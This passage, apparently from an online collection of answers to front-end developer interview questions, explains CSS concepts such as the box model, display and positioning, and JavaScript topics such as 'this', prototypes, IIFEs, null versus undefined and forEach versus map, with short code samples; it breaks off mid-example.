&lt;li&gt;Triangular arrows in tooltips use &lt;code&gt;:before&lt;/code&gt; and &lt;code&gt;:after&lt;/code&gt;. Encourages separation of concerns because the triangle is considered part of styling and not really the DOM. It's not really possible to draw a triangle with just CSS styles without using an additional HTML element.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain your understanding of the box model and how you would tell the browser in CSS to render your layout in different box models.&lt;/h3&gt;
&lt;p&gt;The CSS box model describes the rectangular boxes that are generated for elements in the document tree and laid out according to the visual formatting model. Each box has a content area (e.g. text, an image, etc.) and optional surrounding &lt;code&gt;padding&lt;/code&gt;, &lt;code&gt;border&lt;/code&gt;, and &lt;code&gt;margin&lt;/code&gt; areas.&lt;/p&gt;
&lt;p&gt;The CSS box model is responsible for calculating:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;How much space a block element takes up.&lt;/li&gt;
&lt;li&gt;Whether or not borders and/or margins overlap, or collapse.&lt;/li&gt;
&lt;li&gt;A box's dimensions.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The box model has the following rules:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The dimensions of a block element are calculated by &lt;code&gt;width&lt;/code&gt;, &lt;code&gt;height&lt;/code&gt;, &lt;code&gt;padding&lt;/code&gt;, &lt;code&gt;border&lt;/code&gt;s, and &lt;code&gt;margin&lt;/code&gt;s.&lt;/li&gt;
&lt;li&gt;If no &lt;code&gt;height&lt;/code&gt; is specified, a block element will be as high as the content it contains, plus &lt;code&gt;padding&lt;/code&gt; (unless there are floats, for which see below).&lt;/li&gt;
&lt;li&gt;If no &lt;code&gt;width&lt;/code&gt; is specified, a non-floated block element will expand to fit the width of its parent minus &lt;code&gt;padding&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;height&lt;/code&gt; of an element is calculated by the content's &lt;code&gt;height&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;width&lt;/code&gt; of an element is calculated by the content's &lt;code&gt;width&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;By default, &lt;code&gt;padding&lt;/code&gt;s and &lt;code&gt;border&lt;/code&gt;s are not part of the &lt;code&gt;width&lt;/code&gt; and &lt;code&gt;height&lt;/code&gt; of an element.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What does &lt;code&gt;* { box-sizing: border-box; }&lt;/code&gt; do? What are its advantages?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;By default, elements have &lt;code&gt;box-sizing: content-box&lt;/code&gt; applied, and only the content size is being accounted for.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;box-sizing: border-box&lt;/code&gt; changes how the &lt;code&gt;width&lt;/code&gt; and &lt;code&gt;height&lt;/code&gt; of elements are being calculated, &lt;code&gt;border&lt;/code&gt; and &lt;code&gt;padding&lt;/code&gt; are also being included in the calculation.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;height&lt;/code&gt; of an element is now calculated by the content's &lt;code&gt;height&lt;/code&gt; + vertical &lt;code&gt;padding&lt;/code&gt; + vertical &lt;code&gt;border&lt;/code&gt; width.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;width&lt;/code&gt; of an element is now calculated by the content's &lt;code&gt;width&lt;/code&gt; + horizontal &lt;code&gt;padding&lt;/code&gt; + horizontal &lt;code&gt;border&lt;/code&gt; width.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;What is the CSS &lt;code&gt;display&lt;/code&gt; property and can you give a few examples of its use?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;none&lt;/code&gt;, &lt;code&gt;block&lt;/code&gt;, &lt;code&gt;inline&lt;/code&gt;, &lt;code&gt;inline-block&lt;/code&gt;, &lt;code&gt;table&lt;/code&gt;, &lt;code&gt;table-row&lt;/code&gt;, &lt;code&gt;table-cell&lt;/code&gt;, &lt;code&gt;list-item&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;What's the difference between &lt;code&gt;inline&lt;/code&gt; and &lt;code&gt;inline-block&lt;/code&gt;?&lt;/h3&gt;
&lt;p&gt;I shall throw in a comparison with &lt;code&gt;block&lt;/code&gt; for good measure.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th/&gt;
&lt;th&gt;&lt;code&gt;block&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;inline-block&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;inline&lt;/code&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;
&lt;td&gt;Fills up the width of its parent container.&lt;/td&gt;
&lt;td&gt;Depends on content.&lt;/td&gt;
&lt;td&gt;Depends on content.&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Positioning&lt;/td&gt;
&lt;td&gt;Start on a new line and tolerates no HTML elements next to it (except when you add &lt;code&gt;float&lt;/code&gt;)&lt;/td&gt;
&lt;td&gt;Flows along with other content and allows other elements beside.&lt;/td&gt;
&lt;td&gt;Flows along with other content and allows other elements beside.&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Can specify &lt;code&gt;width&lt;/code&gt; and &lt;code&gt;height&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;No. Will ignore if being set.&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Can be aligned with &lt;code&gt;vertical-align&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Margins and paddings&lt;/td&gt;
&lt;td&gt;All sides respected.&lt;/td&gt;
&lt;td&gt;All sides respected.&lt;/td&gt;
&lt;td&gt;Only horizontal sides respected. Vertical sides, if specified, do not affect layout. Vertical space it takes up depends on &lt;code&gt;line-height&lt;/code&gt;, even though the &lt;code&gt;border&lt;/code&gt; and &lt;code&gt;padding&lt;/code&gt; appear visually around the content.&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Float&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;Becomes like a &lt;code&gt;block&lt;/code&gt; element where you can set vertical margins and paddings.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3&gt;What's the difference between a &lt;code&gt;relative&lt;/code&gt;, &lt;code&gt;fixed&lt;/code&gt;, &lt;code&gt;absolute&lt;/code&gt; and &lt;code&gt;static&lt;/code&gt;ally positioned element?&lt;/h3&gt;
&lt;p&gt;A positioned element is an element whose computed &lt;code&gt;position&lt;/code&gt; property is either &lt;code&gt;relative&lt;/code&gt;, &lt;code&gt;absolute&lt;/code&gt;, &lt;code&gt;fixed&lt;/code&gt; or &lt;code&gt;sticky&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;static&lt;/code&gt; - The default position; the element will flow into the page as it normally would. The &lt;code&gt;top&lt;/code&gt;, &lt;code&gt;right&lt;/code&gt;, &lt;code&gt;bottom&lt;/code&gt;, &lt;code&gt;left&lt;/code&gt; and &lt;code&gt;z-index&lt;/code&gt; properties do not apply.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;relative&lt;/code&gt; - The element's position is adjusted relative to itself, without changing layout (and thus leaving a gap for the element where it would have been had it not been positioned).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;absolute&lt;/code&gt; - The element is removed from the flow of the page and positioned at a specified position relative to its closest positioned ancestor if any, or otherwise relative to the initial containing block. Absolutely positioned boxes can have margins, and they do not collapse with any other margins. These elements do not affect the position of other elements.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fixed&lt;/code&gt; - The element is removed from the flow of the page and positioned at a specified position relative to the viewport and doesn't move when scrolled.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sticky&lt;/code&gt; - Sticky positioning is a hybrid of relative and fixed positioning. The element is treated as &lt;code&gt;relative&lt;/code&gt; positioned until it crosses a specified threshold, at which point it is treated as &lt;code&gt;fixed&lt;/code&gt; positioned.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What existing CSS frameworks have you used locally, or in production? How would you change/improve them?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Bootstrap&lt;/strong&gt; - Slow release cycle. Bootstrap 4 has been in alpha for almost 2 years. Add a spinner button component, as it is widely-used.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Semantic UI&lt;/strong&gt; - Source code structure makes theme customization extremely hard to understand. Painful to customize with unconventional theming system. Hardcoded config path within the vendor library. Not well-designed for overriding variables unlike in Bootstrap.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bulma&lt;/strong&gt; - A lot of non-semantic and superfluous classes and markup required. Not backward compatible. Upgrading versions breaks the app in subtle manners.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Have you played around with the new CSS Flexbox or Grid specs?&lt;/h3&gt;
&lt;p&gt;Yes. Flexbox is mainly meant for 1-dimensional layouts while Grid is meant for 2-dimensional layouts.&lt;/p&gt;
&lt;p&gt;Flexbox solves many common problems in CSS, such as vertical centering of elements within a container, sticky footer, etc. Bootstrap and Bulma are based on Flexbox, and it is probably the recommended way to create layouts these days. Have tried Flexbox before but ran into some browser incompatibility issues (Safari) in using &lt;code&gt;flex-grow&lt;/code&gt;, and I had to rewrite my code using &lt;code&gt;inline-blocks&lt;/code&gt; and math to calculate the widths in percentages, it wasn't a nice experience.&lt;/p&gt;
&lt;p&gt;Grid is by far the most intuitive approach for creating grid-based layouts (it better be!) but browser support is not wide at the moment.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Can you explain the difference between coding a web site to be responsive versus using a mobile-first strategy?&lt;/h3&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h3&gt;How is responsive design different from adaptive design?&lt;/h3&gt;
&lt;p&gt;Both responsive and adaptive design attempt to optimize the user experience across different devices, adjusting for different viewport sizes, resolutions, usage contexts, control mechanisms, and so on.&lt;/p&gt;
&lt;p&gt;Responsive design works on the principle of flexibility - a single fluid website that can look good on any device. Responsive websites use media queries, flexible grids, and responsive images to create a user experience that flexes and changes based on a multitude of factors. Like a single ball growing or shrinking to fit through several different hoops.&lt;/p&gt;
&lt;p&gt;Adaptive design is more like the modern definition of progressive enhancement. Instead of one flexible design, adaptive design detects the device and other features, and then provides the appropriate feature and layout based on a predefined set of viewport sizes and other characteristics. The site detects the type of device used, and delivers the pre-set layout for that device. Instead of a single ball going through several different-sized hoops, you'd have several different balls to use depending on the hoop size.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Have you ever worked with retina graphics? If so, when and what techniques did you use?&lt;/h3&gt;
&lt;p&gt;I tend to use higher resolution graphics (twice the display size) to handle retina display. The better way would be to use a media query like &lt;code&gt;@media only screen and (min-device-pixel-ratio: 2) { ... }&lt;/code&gt; and change the &lt;code&gt;background-image&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;For icons, I would also opt to use svgs and icon fonts where possible, as they render very crisply regardless of resolution.&lt;/p&gt;
&lt;p&gt;Another method would be to use JavaScript to replace the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; &lt;code&gt;src&lt;/code&gt; attribute with higher resolution versions after checking the &lt;code&gt;window.devicePixelRatio&lt;/code&gt; value.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Is there any reason you'd want to use &lt;code&gt;translate()&lt;/code&gt; instead of &lt;code&gt;absolute&lt;/code&gt; positioning, or vice-versa? And why?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;translate()&lt;/code&gt; is a value of CSS &lt;code&gt;transform&lt;/code&gt;. Changing &lt;code&gt;transform&lt;/code&gt; or &lt;code&gt;opacity&lt;/code&gt; does not trigger browser reflow or repaint, only compositions, whereas changing the absolute positioning triggers &lt;code&gt;reflow&lt;/code&gt;. &lt;code&gt;transform&lt;/code&gt; causes the browser to create a GPU layer for the element but changing absolute positioning properties uses the CPU. Hence &lt;code&gt;translate()&lt;/code&gt; is more efficient and will result in shorter paint times for smoother animations.&lt;/p&gt;
&lt;p&gt;When using &lt;code&gt;translate()&lt;/code&gt;, the element still takes up its original space (sort of like &lt;code&gt;position: relative&lt;/code&gt;), unlike in changing the absolute positioning.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Other Answers&lt;/h3&gt;
&lt;hr/&gt;&lt;h2&gt;JS Questions&lt;/h2&gt;
&lt;p&gt;Answers to &lt;a href=&quot;https://github.com/h5bp/Front-end-Developer-Interview-Questions#js-questions&quot;&gt;Front-end Job Interview Questions - JS Questions&lt;/a&gt;. Pull requests for suggestions and corrections are welcome!&lt;/p&gt;
&lt;h3&gt;Explain event delegation&lt;/h3&gt;
&lt;p&gt;Event delegation is a technique involving adding event listeners to a parent element instead of adding them to the descendant elements. The listener will fire whenever the event is triggered on the descendant elements due to event bubbling up the DOM. The benefits of this technique are:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Memory footprint goes down because only one single handler is needed on the parent element, rather than having to attach event handlers on each descendant.&lt;/li&gt;
&lt;li&gt;There is no need to unbind the handler from elements that are removed and to bind the event for new elements.&lt;/li&gt;
&lt;/ul&gt;&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain how &lt;code&gt;this&lt;/code&gt; works in JavaScript&lt;/h3&gt;
&lt;p&gt;There's no simple explanation for &lt;code&gt;this&lt;/code&gt;; it is one of the most confusing concepts in JavaScript. A hand-wavey explanation is that the value of &lt;code&gt;this&lt;/code&gt; depends on how the function is called. I have read many explanations on &lt;code&gt;this&lt;/code&gt; online, and I found &lt;a href=&quot;https://medium.com/@arnav_aggarwal&quot; rel=&quot;nofollow&quot;&gt;Arnav Aggrawal&lt;/a&gt;'s explanation to be the clearest. The following rules are applied:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;If the &lt;code&gt;new&lt;/code&gt; keyword is used when calling the function, &lt;code&gt;this&lt;/code&gt; inside the function is a brand new object.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;apply&lt;/code&gt;, &lt;code&gt;call&lt;/code&gt;, or &lt;code&gt;bind&lt;/code&gt; are used to call/create a function, &lt;code&gt;this&lt;/code&gt; inside the function is the object that is passed in as the argument.&lt;/li&gt;
&lt;li&gt;If a function is called as a method, such as &lt;code&gt;obj.method()&lt;/code&gt; — &lt;code&gt;this&lt;/code&gt; is the object that the function is a property of.&lt;/li&gt;
&lt;li&gt;If a function is invoked as a free function invocation, meaning it was invoked without any of the conditions present above, &lt;code&gt;this&lt;/code&gt; is the global object. In a browser, it is the &lt;code&gt;window&lt;/code&gt; object. If in strict mode (&lt;code&gt;'use strict'&lt;/code&gt;), &lt;code&gt;this&lt;/code&gt; will be &lt;code&gt;undefined&lt;/code&gt; instead of the global object.&lt;/li&gt;
&lt;li&gt;If multiple of the above rules apply, the rule that is higher wins and will set the &lt;code&gt;this&lt;/code&gt; value.&lt;/li&gt;
&lt;li&gt;If the function is an ES2015 arrow function, it ignores all the rules above and receives the &lt;code&gt;this&lt;/code&gt; value of its surrounding scope at the time it is created.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;For an in-depth explanation, do check out his &lt;a href=&quot;https://codeburst.io/the-simple-rules-to-this-in-javascript-35d97f31bde3&quot; rel=&quot;nofollow&quot;&gt;article on Medium&lt;/a&gt;.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain how prototypal inheritance works&lt;/h3&gt;
&lt;p&gt;This is an extremely common JavaScript interview question. All JavaScript objects have a &lt;code&gt;prototype&lt;/code&gt; property, that is a reference to another object. When a property is accessed on an object and if the property is not found on that object, the JavaScript engine looks at the object's &lt;code&gt;prototype&lt;/code&gt;, and the &lt;code&gt;prototype&lt;/code&gt;'s &lt;code&gt;prototype&lt;/code&gt; and so on, until it finds the property defined on one of the &lt;code&gt;prototype&lt;/code&gt;s or until it reaches the end of the prototype chain. This behaviour simulates classical inheritance, but it is really more of &lt;a href=&quot;https://davidwalsh.name/javascript-objects&quot; rel=&quot;nofollow&quot;&gt;delegation than inheritance&lt;/a&gt;.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What do you think of AMD vs CommonJS?&lt;/h3&gt;
&lt;p&gt;Both are ways to implement a module system, which was not natively present in JavaScript until ES2015 came along. CommonJS is synchronous while AMD (Asynchronous Module Definition) is obviously asynchronous. CommonJS is designed with server-side development in mind while AMD, with its support for asynchronous loading of modules, is more intended for browsers.&lt;/p&gt;
&lt;p&gt;I find AMD syntax to be quite verbose and CommonJS is closer to the style you would write import statements in other languages. Most of the time, I find AMD unnecessary, because if you served all your JavaScript into one concatenated bundle file, you wouldn't benefit from the async loading properties. Also, CommonJS syntax is closer to Node style of writing modules and there is less context-switching overhead when switching between client side and server side JavaScript development.&lt;/p&gt;
&lt;p&gt;I'm glad that with ES2015 modules, that has support for both synchronous and asynchronous loading, we can finally just stick to one approach. Although it hasn't been fully rolled out in browsers and in Node, we can always use transpilers to convert our code.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain why the following doesn't work as an IIFE: &lt;code&gt;function foo(){ }();&lt;/code&gt;. What needs to be changed to properly make it an IIFE?&lt;/h3&gt;
&lt;p&gt;IIFE stands for Immediately Invoked Function Expressions. The JavaScript parser reads &lt;code&gt;function foo(){ }();&lt;/code&gt; as &lt;code&gt;function foo(){ }&lt;/code&gt; and &lt;code&gt;();&lt;/code&gt;, where the former is a function declaration and the latter (a pair of brackets) is an attempt at calling a function but there is no name specified, hence it throws &lt;code&gt;Uncaught SyntaxError: Unexpected token )&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Here are two ways to fix it that involves adding more brackets: &lt;code&gt;(function foo(){ })()&lt;/code&gt; and &lt;code&gt;(function foo(){ }())&lt;/code&gt;. These functions are not exposed in the global scope and you can even omit its name if you do not need to reference itself within the body.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What's the difference between a variable that is: &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;undefined&lt;/code&gt; or undeclared? How would you go about checking for any of these states?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Undeclared&lt;/strong&gt; variables are created when you assign to a value to an identifier that is not previously created using &lt;code&gt;var&lt;/code&gt;, &lt;code&gt;let&lt;/code&gt; or &lt;code&gt;const&lt;/code&gt;. Undeclared variables will be defined globally, outside of the current scope. In strict mode, a &lt;code&gt;ReferenceError&lt;/code&gt; will be thrown when you try to assign to an undeclared variable. Undeclared variables are bad just like how global variables are bad. Avoid them at all cost! To check for them, wrap its usage in a &lt;code&gt;try&lt;/code&gt;/&lt;code&gt;catch&lt;/code&gt; block.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;() {
  x &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Throws a ReferenceError in strict mode&lt;/span&gt;
}

&lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;();
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(x); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A variable that is &lt;code&gt;undefined&lt;/code&gt; is a variable that has been declared, but not assigned a value. It is of type &lt;code&gt;undefined&lt;/code&gt;. If a function does not return any value as the result of executing it is assigned to a variable, the variable also has the value of &lt;code&gt;undefined&lt;/code&gt;. To check for it, compare using the strict equality (&lt;code&gt;===&lt;/code&gt;) operator or &lt;code&gt;typeof&lt;/code&gt; which will give the &lt;code&gt;'undefined'&lt;/code&gt; string. Note that you should not be using the abstract equality operator to check, as it will also return &lt;code&gt;true&lt;/code&gt; if the value is &lt;code&gt;null&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; foo;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; undefined&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo &lt;span class=&quot;pl-k&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;undefined&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;typeof&lt;/span&gt; foo &lt;span class=&quot;pl-k&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;undefined&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true. Wrong, don't use this to check!&lt;/span&gt;

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;bar&lt;/span&gt;() {}
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; baz &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;bar&lt;/span&gt;();
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(baz); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; undefined&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A variable that is &lt;code&gt;null&lt;/code&gt; will have been explicitly assigned to the &lt;code&gt;null&lt;/code&gt; value. It represents no value and is different from &lt;code&gt;undefined&lt;/code&gt; in the sense that it has been explicitly assigned. To check for &lt;code&gt;null,&lt;/code&gt; simply compare using the strict equality operator. Note that like the above, you should not be using the abstract equality operator (&lt;code&gt;==&lt;/code&gt;) to check, as it will also return &lt;code&gt;true&lt;/code&gt; if the value is &lt;code&gt;undefined&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; foo &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo &lt;span class=&quot;pl-k&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo &lt;span class=&quot;pl-k&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;undefined&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; true. Wrong, don't use this to check!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As a personal habit, I never leave my variables undeclared or unassigned. I will explicitly assign &lt;code&gt;null&lt;/code&gt; to them after declaring, if I don't intend to use it yet.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What is a closure, and how/why would you use one?&lt;/h3&gt;
&lt;p&gt;A closure is the combination of a function and the lexical environment within which that function was declared. The word &quot;lexical&quot; refers to the fact that lexical scoping uses the location where a variable is declared within the source code to determine where that variable is available. Closures are functions that have access to the outer (enclosing) function's variables—scope chain even after the outer function has returned.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Why would you use one?&lt;/strong&gt;&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Can you describe the main difference between a &lt;code&gt;.forEach&lt;/code&gt; loop and a &lt;code&gt;.map()&lt;/code&gt; loop and why you would pick one versus the other?&lt;/h3&gt;
&lt;p&gt;To understand the differences between the two, let's look at what each function does.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;forEach&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Iterates through the elements in an array.&lt;/li&gt;
&lt;li&gt;Executes a callback for each element.&lt;/li&gt;
&lt;li&gt;Does not return a value.&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; [&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt;];
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;doubled&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;a&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;forEach&lt;/span&gt;((&lt;span class=&quot;pl-smi&quot;&gt;num&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;index&lt;/span&gt;) &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; {
  &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Do something with num and/or index.&lt;/span&gt;
});

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; doubled = undefined&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;map&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Iterates through the elements in an array.&lt;/li&gt;
&lt;li&gt;&quot;Maps&quot; each element to a new element by calling the function on each element, creating a new array as a result.&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; [&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt;];
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;doubled&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;a&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; num &lt;span class=&quot;pl-k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;;
});

